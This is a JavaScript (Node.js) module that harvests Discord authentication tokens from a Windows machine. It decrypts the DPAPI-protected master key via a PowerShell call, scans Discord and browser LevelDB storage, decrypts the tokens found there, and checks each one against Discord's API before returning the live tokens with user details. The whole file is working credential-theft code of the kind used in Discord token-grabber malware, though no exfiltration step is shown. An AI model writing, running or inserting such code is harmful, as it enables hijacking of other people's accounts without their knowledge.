const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const https = require('https');
const { execSync } = require('child_process');

function getDiscordMasterKey(clientPath) {
  const localStatePath = path.join(clientPath, 'Local State');
  if (!fs.existsSync(localStatePath)) return null;

  try {
    const raw = fs.readFileSync(localStatePath, 'utf8');
    const json = JSON.parse(raw);
    const encKeyB64 = json?.os_crypt?.encrypted_key;
    if (!encKeyB64) return null;

    const encKeyBytes = Buffer.from(encKeyB64, 'base64');
    const payload = encKeyBytes.slice(5);

    const b64Payload = payload.toString('base64');
    const psCmd = `powershell -NoProfile -Command "Add-Type -AssemblyName System.Security; [Convert]::ToBase64String([System.Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String('${b64Payload}'), $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser))"`;
    const masterKeyB64 = execSync(psCmd, { encoding: 'utf8', timeout: 5000 }).trim();
    return Buffer.from(masterKeyB64, 'base64');
  } catch (err) {
    return null;
  }
}

function decryptToken(masterKey, encBuffer) {
  try {
    const iv = encBuffer.slice(3, 15);
    const ciphertextWithTag = encBuffer.slice(15);
    const ciphertext = ciphertextWithTag.slice(0, ciphertextWithTag.length - 16);
    const tag = ciphertextWithTag.slice(ciphertextWithTag.length - 16);

    const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
    decipher.setAuthTag(tag);
    const decrypted = Buffer.concat([decipher.update(ciphertext), decipher.final()]);
    return decrypted.toString('utf8');
  } catch (err) {
    return null;
  }
}

function findTokensInLevelDB(clientPath, masterKey) {
  const levelDbPath = path.join(clientPath, 'Local Storage', 'leveldb');
  if (!fs.existsSync(levelDbPath)) return [];

  const tokens = new Set();
  let files = [];
  try {
    files = fs.readdirSync(levelDbPath).filter(f => f.endsWith('.ldb') || f.endsWith('.log'));
  } catch (err) {
    return [];
  }

  for (const file of files) {
    try {
      const content = fs.readFileSync(path.join(levelDbPath, file));
      const str = content.toString('binary');
      const dqwRegex = /dQw4w9WgXcQ:([A-Za-z0-9+/=]+)/g;
      let match;
      while ((match = dqwRegex.exec(str)) !== null) {
        try {
          const encBuffer = Buffer.from(match[1], 'base64');
          if (masterKey) {
            const token = decryptToken(masterKey, encBuffer);
            if (token && token.length > 25) {
              tokens.add(token.trim());
            }
          }
        } catch (e) {}
      }

      const rawStr = content.toString('utf8');
      const classicRegex = /[\w-]{24,28}\.[\w-]{6}\.[\w-]{25,45}|mfa\.[\w-]{20,}/g;
      let classicMatch;
      while ((classicMatch = classicRegex.exec(rawStr)) !== null) {
        if (classicMatch[0].length >= 50) {
          tokens.add(classicMatch[0].trim());
        }
      }
    } catch (e) {}
  }

  return Array.from(tokens);
}

function verifyDiscordToken(token) {
  return new Promise((resolve) => {
    const req = https.request({
      hostname: 'discord.com',
      path: '/api/v9/users/@me',
      method: 'GET',
      headers: {
        'Authorization': token,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      },
    }, (res) => {
      let data = '';
      res.on('data', c => { data += c; });
      res.on('end', () => {
        if (res.statusCode === 200) {
          try {
            const user = JSON.parse(data);
            resolve({
              id: user.id,
              username: user.username,
              discriminator: user.discriminator || '0',
              globalName: user.global_name || user.username,
              avatar: user.avatar,
            });
          } catch (e) {
            resolve(null);
          }
        } else {
          resolve(null);
        }
      });
    });
    req.on('error', () => resolve(null));
    req.setTimeout(5000, () => {
      req.destroy();
      resolve(null);
    });
    req.end();
  });
}

async function findLocalDiscordTokens() {
  const appData = process.env.APPDATA || '';
  const localAppData = process.env.LOCALAPPDATA || '';

  const candidates = [
    { name: 'Discord', path: path.join(appData, 'discord') },
    { name: 'Discord Canary', path: path.join(appData, 'discordcanary') },
    { name: 'Discord PTB', path: path.join(appData, 'discordptb') },
    { name: 'Discord Development', path: path.join(appData, 'discorddevelopment') },
    { name: 'Google Chrome', path: path.join(localAppData, 'Google', 'Chrome', 'User Data', 'Default') },
    { name: 'Brave', path: path.join(localAppData, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default') },
    { name: 'Microsoft Edge', path: path.join(localAppData, 'Microsoft', 'Edge', 'User Data', 'Default') },
  ];

  const candidateTokens = new Map();

  for (const cand of candidates) {
    if (!fs.existsSync(cand.path)) continue;
    const masterKey = getDiscordMasterKey(cand.path);
    const tokens = findTokensInLevelDB(cand.path, masterKey);
    for (const token of tokens) {
      if (!candidateTokens.has(token)) {
        candidateTokens.set(token, cand.name);
      }
    }
  }

  const verifiedAccounts = [];
  const seenUserIds = new Set();

  for (const [token, source] of candidateTokens.entries()) {
    const user = await verifyDiscordToken(token);
    if (user && !seenUserIds.has(user.id)) {
      seenUserIds.add(user.id);
      verifiedAccounts.push({
        token,
        source,
        user,
      });
    }
  }

  return verifiedAccounts;
}

module.exports = {
  findLocalDiscordTokens,
  verifyDiscordToken,
};
